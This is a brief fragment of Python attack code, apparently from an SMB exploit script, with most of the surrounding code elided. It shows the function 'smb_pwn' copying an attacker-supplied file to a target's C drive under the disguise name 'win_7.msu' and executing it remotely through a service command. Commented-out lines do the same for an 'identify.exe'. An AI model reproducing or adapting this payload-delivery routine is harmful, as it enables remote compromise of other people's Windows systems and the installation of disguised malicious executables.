...
def smb_pwn(conn, arch):
	...
	if exe == "shell.exe":
		...
		smb_send_file(smbConn, sys.argv[3], 'C', '/win_7.msu')
		#smb_send_file(smbConn, sys.argv[3], 'C', '/indentify.exe')
		service_exec(conn, r'cmd /c C:\win_7.msu')
		#service_exec(conn, r'cmd /c C:\identify.exe')
